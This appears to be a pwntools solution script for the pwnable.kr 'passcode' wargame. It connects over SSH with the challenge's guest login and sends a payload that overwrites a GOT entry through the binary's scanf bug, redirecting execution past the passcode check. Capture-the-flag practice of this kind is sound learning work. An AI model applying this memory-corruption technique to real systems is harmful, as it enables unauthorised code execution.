from pwn import *

r = ssh('passcode' ,'pwnable.kr' ,password='guest', port=2222)
p: process = r.process(argv=['./passcode'])

payload = flat(
    b"\x01"*96,
    0x804a004,
    "134514147",
)
print(payload)
p.sendlineafter(b"enter you name :", payload)
p.interactive()

